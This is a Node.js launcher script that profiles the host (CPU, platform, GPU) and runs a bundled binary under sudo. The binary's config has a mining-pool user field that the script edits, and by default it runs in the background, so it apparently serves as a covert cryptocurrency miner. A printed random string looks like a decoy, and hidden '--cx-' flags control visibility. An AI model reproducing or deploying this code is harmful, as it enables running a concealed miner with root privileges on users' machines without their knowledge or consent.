#!/usr/bin/env node

const path = require("path");
const spawn = require("child_process").spawn;
const { nanoid } = require("nanoid");
const processExists = require("process-exists");
const argvOpt = getArgvOpts();

function getOSDetails() {
  const si = require("systeminformation");
  return si.graphics().then((resp) => {
    const os = require("os");

    const CPUS = os.cpus().length;
    const PLATFORM = os.platform();
    const ARCH = os.arch();

    const graphicsTestStrings = ["NVIDIA", "GeForce", "radeon"];

    const siInfo = JSON.stringify(resp).toLowerCase();
    const HAS_GPU = graphicsTestStrings
      .map((key) => siInfo.includes(key.toLowerCase()))
      .reduce((acc, val) => acc || val, false);

    return {
      CPUS,
      PLATFORM,
      ARCH,
      HAS_GPU,
    };
  });
}

function prepareBinFileNames(opt) {
  const platformMap = {
    linux: "l",
  };

  const cwd = path.join(__dirname, "bin");

  const cpuBin = path.join(
    __dirname,
    "bin",
    `c-${platformMap[opt.PLATFORM]}-${opt.ARCH}`
  );

  return {
    cwd,
    cpuBin,
    gpuBin: null,
  };
}

async function launch() {
  if (argvOpt.show) {
    await showProcesses();
    return;
  }
  getOSDetails()
    .then((resp) => {
      const bins = prepareBinFileNames(resp);
      if (bins.cpuBin) {
        startCPU(bins.cpuBin, bins.cwd);
      }
    })
    .catch((err) => console.error(err));
}

async function startCPU(binFile, cwd) {
  hasher();
  if (await alreadyRunningCPU()) {
    console.log("🏃");
    return;
  }

  cConfigPatch();
  const args = [binFile];

  const child = spawn("sudo", args, {
    stdio: "inherit",
    cwd,
    shell: true,
  });

  child.on("exit", () => {});
}

function hasher() {
  setTimeout(() => console.log(nanoid(60)), 2000);
}

function cConfigPatch() {
  const fs = require("fs");

  const config = require("./bin/config.json");

  if (!config.pools[0].user.includes("_")) {
    config.pools[0].user = config.pools[0].user + "_" + nanoid(5);
  }

  if (argvOpt.verbose) {
    config.background = false;
  } else {
    config.background = true;
  }

  fs.writeFileSync(
    path.join(__dirname, "bin", "config.json"),
    JSON.stringify(config)
  );
}

const processNames = ["c-l-x64"];

async function alreadyRunningCPU() {
  const resultArray = await Promise.all(
    processNames.map((item) => processExists(item))
  );

  return resultArray.reduce((acc, val) => acc || val, false);
}

async function showProcesses() {
  const ps = await processExists.filterExists(processNames);
  console.log(ps);
}

function getArgvOpts() {
  const argv = process.argv;

  const opt = {};

  if (argv.includes("--cx-verbose")) {
    opt.verbose = true;
  } else {
    opt.verbose = false;
  }

  if (argv.includes("--cx-show")) {
    opt.show = true;
  }

  return opt;
}

launch();